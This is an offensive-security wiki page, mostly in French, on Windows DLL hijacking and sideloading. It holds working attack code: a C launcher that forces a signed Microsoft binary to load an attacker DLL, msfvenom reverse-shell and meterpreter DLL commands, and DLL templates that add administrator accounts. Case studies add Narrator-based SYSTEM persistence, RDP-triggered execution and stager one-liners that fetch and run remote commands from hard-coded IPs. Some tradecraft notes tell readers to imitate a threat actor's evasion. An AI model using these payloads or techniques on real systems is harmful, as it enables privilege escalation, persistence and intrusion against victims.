# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informations de base

DLL Hijacking implique de manipuler une application de confiance pour qu'elle charge une DLL malveillante. Ce terme englobe plusieurs tactiques comme **DLL Spoofing, Injection, and Side-Loading**. Il est principalement utilisé pour l'exécution de code, l'obtention de persistance et, moins fréquemment, l'escalade de privilèges. Bien que l'accent soit mis ici sur l'escalade, la méthode de hijacking reste la même quel que soit l'objectif.

### Techniques courantes

Plusieurs méthodes sont employées pour le DLL hijacking, chacune étant plus ou moins efficace selon la stratégie de chargement de DLL de l'application :

1. **DLL Replacement**: Échanger une DLL authentique contre une DLL malveillante, en utilisant éventuellement **DLL Proxying** pour préserver la fonctionnalité de la DLL originale.
2. **DLL Search Order Hijacking**: Placer la DLL malveillante dans un chemin de recherche situé avant la DLL légitime, en exploitant le modèle de recherche de l'application.
3. **Phantom DLL Hijacking**: Créer une DLL malveillante pour qu'une application la charge, pensant qu'il s'agit d'une DLL requise inexistante.
4. **DLL Redirection**: Modifier des paramètres de recherche comme `%PATH%` ou les fichiers `.exe.manifest` / `.exe.local` pour diriger l'application vers la DLL malveillante.
5. **WinSxS DLL Replacement**: Substituer la DLL légitime par une version malveillante dans le répertoire WinSxS, méthode souvent associée au DLL side-loading.
6. **Relative Path DLL Hijacking**: Placer la DLL malveillante dans un répertoire contrôlé par l'utilisateur avec l'application copiée, ressemblant aux techniques de Binary Proxy Execution.

> [!TIP]
> Pour une chaîne étape par étape qui superpose HTML staging, configurations AES-CTR et implants .NET au-dessus du DLL sideloading, consultez le workflow ci-dessous.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Trouver les DLL manquantes

La manière la plus courante de trouver des DLL manquantes sur un système est d'exécuter [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, en **configurant** les **2 filtres suivants** :

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

et n'afficher que la **File System Activity** :

![](<../../../images/image (153).png>)

Si vous recherchez des **DLL manquantes en général**, laissez ceci tourner pendant quelques **secondes**.  
Si vous recherchez une **DLL manquante dans un exécutable spécifique**, vous devez ajouter **un autre filtre comme "Process Name" "contains" `<exec name>`, exécuter l'exécutable, puis arrêter la capture d'événements**.

## Exploiter des DLL manquantes

Pour escalader les privilèges, la meilleure opportunité est de pouvoir **écrire une DLL qu'un processus privilégié va tenter de charger** dans un des **emplacements où elle sera recherchée**. Ainsi, nous pourrons **écrire** une DLL dans un **dossier** où la **DLL est recherchée avant** le dossier contenant la **DLL originale** (cas particulier), ou nous pourrons **écrire dans un dossier où la DLL sera recherchée** alors que la DLL **originale n'existe dans aucun dossier**.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Les applications Windows recherchent les DLLs en suivant un ensemble de chemins de recherche pré-définis, selon une séquence particulière. Le problème du DLL hijacking survient lorsqu'une DLL malveillante est placée stratégiquement dans l'un de ces répertoires, garantissant qu'elle soit chargée avant la DLL authentique. Une solution pour prévenir cela est de s'assurer que l'application utilise des chemins absolus lorsqu'elle référence les DLLs dont elle a besoin.

Vous pouvez voir l'ordre de recherche des DLLs sur 32-bit systèmes ci-dessous :

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

That is the **default** search order with **SafeDllSearchMode** enabled. When it's disabled the current directory escalates to second place. To disable this feature, create the **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value and set it to 0 (default is enabled).

If [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function is called with **LOAD_WITH_ALTERED_SEARCH_PATH** the search begins in the directory of the executable module that **LoadLibraryEx** is loading.

Finally, note that **a dll could be loaded indicating the absolute path instead just the name**. In that case that dll is **only going to be searched in that path** (if the dll has any dependencies, they are going to be searched as just loaded by name).

There are other ways to alter the ways to alter the search order but I'm not going to explain them here.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

An advanced way to deterministically influence the DLL search path of a newly created process is to set the DllPath field in RTL_USER_PROCESS_PARAMETERS when creating the process with ntdll’s native APIs. By supplying an attacker-controlled directory here, a target process that resolves an imported DLL by name (no absolute path and not using the safe loading flags) can be forced to load a malicious DLL from that directory.

Idée clé
- Construire les paramètres du processus avec RtlCreateProcessParametersEx et fournir un DllPath personnalisé pointant vers votre dossier contrôlé (par ex. le répertoire où vit votre dropper/unpacker).
- Créer le processus avec RtlCreateUserProcess. Lorsque le binaire cible résout une DLL par nom, le loader consultera ce DllPath fourni pendant la résolution, permettant un sideloading fiable même lorsque la DLL malveillante n'est pas colocée avec l'EXE cible.

Remarques / limitations
- Cela affecte le processus enfant créé ; c'est différent de SetDllDirectory, qui n'affecte que le processus courant.
- La cible doit importer ou appeler LoadLibrary sur une DLL par nom (pas de chemin absolu et ne pas utiliser LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs et chemins absolus codés en dur ne peuvent pas être détournés. Les exports forwardés et SxS peuvent changer la priorité.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Exigences**:

- Identifier un processus qui fonctionne ou fonctionnera sous des **privilèges différents** (mouvement horizontal ou latéral), et qui **manque d'une DLL**.
- S'assurer qu'un **accès en écriture** est disponible pour tout **répertoire** dans lequel la **DLL** sera **recherchée**. Cet emplacement peut être le répertoire de l'exécutable ou un répertoire dans le chemin système.

Oui, les prérequis sont compliqués à trouver car **par défaut c'est un peu étrange de trouver un exécutable privilégié sans dll** et c'est encore **plus étrange d'avoir des permissions d'écriture sur un dossier du chemin système** (vous ne pouvez pas par défaut). Mais, dans des environnements mal configurés cela est possible.\
Dans le cas où vous avez la chance de remplir les conditions, vous pouvez consulter le projet [UACME](https://github.com/hfiref0x/UACME). Même si le **but principal du projet est bypass UAC**, vous pouvez y trouver un **PoC** de Dll hijaking pour la version de Windows que vous utilisez (probablement en changeant simplement le chemin du dossier où vous avez des permissions d'écriture).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Et **vérifiez les permissions de tous les dossiers contenus dans PATH** :
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vous pouvez également vérifier les imports d'un exécutable et les exports d'une dll avec:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Pour un guide complet expliquant comment **abuser Dll Hijacking pour escalader les privilèges** quand vous avez les permissions d'écriture dans un **dossier System Path**, consultez :

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Outils automatisés

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) vérifiera si vous avez des permissions d'écriture sur n'importe quel dossier dans le system PATH.\
D'autres outils automatisés intéressants pour découvrir cette vulnérabilité sont les **PowerSploit functions** : _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Exemple

Si vous trouvez un scénario exploitable, l'une des choses les plus importantes pour l'exploiter avec succès est de **créer une dll qui exporte au minimum toutes les fonctions que l'exécutable importera depuis elle**. Quoi qu'il en soit, notez que Dll Hijacking est utile pour [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou pour passer de[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Vous pouvez trouver un exemple de **comment créer une dll valide** dans cette étude sur dll hijacking focalisée sur le dll hijacking pour l'exécution : [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
De plus, dans la **section suivante** vous pouvez trouver quelques **codes dll basiques** qui peuvent être utiles comme **templates** ou pour créer une **dll exportant des fonctions non requises**.

## **Création et compilation de Dlls**

### **Dll Proxifying**

En gros, un Dll proxy est un Dll capable d'exécuter votre code malveillant lorsqu'il est chargé, mais aussi d'**exposer** et de **fonctionner** comme attendu en relayant tous les appels vers la bibliothèque réelle.

Avec l'outil [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus) vous pouvez en fait **indiquer un exécutable et sélectionner la bibliothèque** que vous voulez proxify et **générer une proxified dll** ou **indiquer la Dll** et **générer une proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenir un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Créer un utilisateur (x86, je n'ai pas vu de version x64) :**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Votre propre

Notez que dans plusieurs cas, la Dll que vous compilez doit **exporter plusieurs fonctions** qui seront chargées par le processus victime. Si ces fonctions n'existent pas, le **binary ne pourra pas les charger** et l'**exploit échouera**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Exemple de DLL C++ avec création d'utilisateur</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternative avec entrée de thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Étude de cas: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe attaque encore une DLL de localisation prévisible, spécifique à la langue, au démarrage qui peut être détournée pour permettre l'exécution de code arbitraire et la persistance.

Faits clés
- Chemin sondé (versions actuelles) : `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Chemin hérité (anciennes versions) : `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Si une DLL contrôlée par l'attaquant et accessible en écriture existe au chemin OneCore, elle est chargée et `DllMain(DLL_PROCESS_ATTACH)` s'exécute. Aucun export n'est requis.

Découverte avec Procmon
- Filtre : `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Démarrez Narrator et observez la tentative de chargement du chemin ci‑dessus.

DLL minimale
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Un hijack naïf fera parler/mettre en surbrillance l'UI. Pour rester discret, lors de l'attach, énumérez les threads de Narrator, ouvrez le thread principal (`OpenThread(THREAD_SUSPEND_RESUME)`) et `SuspendThread`-ez-le ; continuez dans votre propre thread. Voir le PoC pour le code complet.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Avec ce qui précède, démarrer Narrator charge la DLL plantée. Sur le secure desktop (écran de connexion), appuyez sur CTRL+WIN+ENTER pour démarrer Narrator ; votre DLL s'exécute en tant que SYSTEM sur le bureau sécurisé.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- L'exécution s'arrête lorsque la session RDP se ferme — inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- Vous pouvez cloner une entrée de registre d'Accessibility Tool (AT) intégrée (par ex. CursorIndicator), la modifier pour qu'elle pointe vers un binaire/DLL arbitraire, l'importer, puis définir `configuration` sur ce nom d'AT. Cela permet d'exécuter arbitrairement du code via le framework Accessibility.

Notes
- Écrire sous `%windir%\System32` et modifier des valeurs HKLM nécessite les droits d'administrateur.
- Toute la logique du payload peut vivre dans `DLL_PROCESS_ATTACH` ; aucun export n'est nécessaire.

## Étude de cas: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flux d'attaque

1. En tant qu'utilisateur standard, déposer `hostfxr.dll` dans `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendre que la tâche planifiée s'exécute à 9h30 dans le contexte de l'utilisateur courant.
3. Si un administrateur est connecté lorsque la tâche s'exécute, la DLL malveillante s'exécute dans la session de l'administrateur avec une intégrité moyenne.
4. Enchaîner des techniques standard de UAC bypass pour s'élever d'une intégrité moyenne à des privilèges SYSTEM.

## Étude de cas: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors frequently pair MSI-based droppers with DLL side-loading to execute payloads under a trusted, signed process.

Chain overview
- User downloads MSI. A CustomAction runs silently during the GUI install (e.g., LaunchApplication or a VBScript action), reconstructing the next stage from embedded resources.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).

MSI analysis (ce qu'il faut rechercher)
- CustomAction table:
- Rechercher des entrées qui exécutent des exécutables ou du VBScript. Exemple de motif suspect : LaunchApplication exécutant un fichier embarqué en arrière-plan.
- Dans Orca (Microsoft Orca.exe), inspecter les tables CustomAction, InstallExecuteSequence et Binary.
- Embedded/split payloads in the MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Chercher plusieurs petits fragments qui sont concaténés et décryptés par une CustomAction VBScript. Flux commun:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Sideloading pratique avec wsc_proxy.exe
- Déposez ces deux fichiers dans le même dossier :
- wsc_proxy.exe: hôte légitime signé (Avast). Le processus tente de charger wsc.dll par son nom depuis son répertoire.
- wsc.dll: DLL de l'attaquant. Si aucun exports spécifiques ne sont requis, DllMain peut suffire ; sinon, construisez un proxy DLL et redirigez les exports requis vers la bibliothèque d'origine tout en exécutant le payload dans DllMain.
- Construisez un payload DLL minimal :
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Pour les exigences d'export, utilisez un framework de proxying (par ex., DLLirant/Spartacus) pour générer une DLL de forwarding qui exécute aussi votre payload.

- Cette technique repose sur la résolution du nom de DLL par le binaire hôte. Si l’hôte utilise des chemins absolus ou des flags de chargement sûrs (par ex., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), le hijack peut échouer.
- KnownDLLs, SxS et les forwarded exports peuvent influencer la priorité et doivent être pris en compte lors du choix du binaire hôte et de l’ensemble des exports.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point a décrit comment Ink Dragon déploie ShadowPad en utilisant une **triade de trois fichiers** pour se fondre dans des logiciels légitimes tout en gardant le payload principal chiffré sur le disque :

1. **Signed host EXE** – des fournisseurs tels que AMD, Realtek ou NVIDIA sont abusés (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Les attaquants renomment l’exécutable pour qu’il ressemble à un binaire Windows (par exemple `conhost.exe`), mais la signature Authenticode reste valide.
2. **Malicious loader DLL** – déposée à côté de l’EXE avec un nom attendu (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL est généralement un binaire MFC obfusqué avec le framework ScatterBrain ; son seul rôle est de localiser le blob chiffré, le déchiffrer, et mapper ShadowPad reflectively.
3. **Encrypted payload blob** – souvent stocké comme `<name>.tmp` dans le même répertoire. Après avoir memory-mappé le payload déchiffré, le loader supprime le fichier TMP pour détruire les preuves forensiques.

Tradecraft notes :

* Renommer l’EXE signé (tout en conservant le `OriginalFileName` d’origine dans le PE header) lui permet de se faire passer pour un binaire Windows tout en conservant la signature du vendor, donc répliquez l’habitude d’Ink Dragon de déposer des binaires ressemblant à `conhost.exe` qui sont en réalité des utilitaires AMD/NVIDIA.
* Parce que l’exécutable reste trusted, la plupart des contrôles d’allowlisting n’exigent que votre DLL malveillante soit présente à côté. Concentrez-vous sur la personnalisation du loader DLL ; le parent signé peut typiquement s’exécuter sans modification.
* Le decryptor de ShadowPad attend que le blob TMP vive à côté du loader et soit writable afin de pouvoir zero le fichier après le mapping. Gardez le répertoire inscriptible jusqu’au chargement du payload ; une fois en mémoire, le fichier TMP peut être supprimé en toute sécurité pour l’OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Les opérateurs associent DLL sideloading à LOLBAS de sorte que le seul artefact personnalisé sur disque soit la DLL malveillante à côté de l’EXE trusted :

- **Remote command loader (Finger):** Un PowerShell caché spawn `cmd.exe /c`, récupère des commandes depuis un serveur Finger, et les pipe vers `cmd` :

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` récupère du texte TCP/79 ; `| cmd` exécute la réponse du serveur, permettant aux opérateurs de faire tourner le second stage côté serveur.

- **Built-in download/extract:** Télécharger une archive avec une extension bénigne, la décompresser, et stage la cible de sideload plus la DLL sous un dossier aléatoire `%LocalAppData%` :

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` masque la progression et suit les redirections ; `tar -xf` utilise le tar intégré de Windows.

- **WMI/CIM launch:** Démarrer l’EXE via WMI pour que la télémétrie montre un process créé par CIM pendant qu’il charge la DLL colocated :

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Fonctionne avec des binaires qui privilégient les DLL locales (par ex., `intelbq.exe`, `nearby_share.exe`) ; le payload (par ex., Remcos) s’exécute sous le nom trusted.

- **Hunting:** Alerter sur `forfiles` lorsque `/p`, `/m` et `/c` apparaissent ensemble ; peu courant en dehors des scripts admin.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Une intrusion Lotus Blossom récente a abusé d’une chaîne de mise à jour trusted pour livrer un dropper empaqueté NSIS qui a stagé un DLL sideload plus des payloads entièrement in-memory.

Tradecraft flow
- `update.exe` (NSIS) crée `%AppData%\Bluetooth`, le marque **HIDDEN**, dépose un Bitdefender Submission Wizard renommé `BluetoothService.exe`, un `log.dll` malveillant, et un blob chiffré `BluetoothService`, puis lance l’EXE.
- Le host EXE importe `log.dll` et appelle `LogInit`/`LogWrite`. `LogInit` mmap-charge le blob ; `LogWrite` le déchiffre avec un flux LCG custom (constantes **0x19660D** / **0x3C6EF35F**, matériau de clé dérivé d’un hash précédent), écrase le buffer avec le shellcode en clair, libère les temporaires, et saute vers celui-ci.
- Pour éviter une IAT, le loader résout les APIs en hashant les noms d’export avec **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, puis en appliquant un avalanche de type Murmur (**0x85EBCA6B**) et en comparant aux hashes ciselés salés cibles.

Main shellcode (Chrysalis)
- Déchiffre un module principal de type PE en répétant add/XOR/sub avec la clé `gQ2JR&9;` sur cinq passes, puis charge dynamiquement `Kernel32.dll` → `GetProcAddress` pour terminer la résolution des imports.
- Reconstruit les chaînes de noms de DLL à l’exécution via des transforms par caractère bit-rotate/XOR, puis charge `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Utilise un second resolver qui parcourt le **PEB → InMemoryOrderModuleList**, parse chaque export table en blocs de 4 octets avec un mixage de type Murmur, et ne retombe sur `GetProcAddress` que si le hash n’est pas trouvé.

Embedded configuration & C2
- La config vit à l’intérieur du fichier `BluetoothService` déposé à **offset 0x30808** (taille **0x980**) et est RC4-decryptée avec la clé `qwhvb^435h&*7`, révélant l’URL C2 et le User-Agent.
- Les beacons construisent un profil hôte délimité par des points, préfixent le tag `4Q`, puis RC4-encryptent avec la clé `vAuig34%^325hGV` avant `HttpSendRequestA` over HTTPS. Les réponses sont RC4-décryptées et dispatchées par un switch de tag (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + cas de transfert en chunks).
- Le mode d’exécution est contrôlé par les args CLI : pas d’args = installer la persistence (service/Run key) pointant vers `-i` ; `-i` relance self avec `-k` ; `-k` saute l’install et exécute le payload.

Alternate loader observed
- La même intrusion a déposé Tiny C Compiler et exécuté `svchost.exe -nostdlib -run conf.c` depuis `C:\ProgramData\USOShared\`, avec `libtcc.dll` à côté. Le source C fourni par l’attaquant embarquait le shellcode, compilait et s’exécutait en-memory sans toucher le disque avec un PE. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Cette étape compile-and-run basée sur TCC a importé `Wininet.dll` à l'exécution et a récupéré un shellcode de second stade depuis une URL codée en dur, fournissant un loader flexible qui se fait passer pour une exécution de compilateur run.

## Références

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
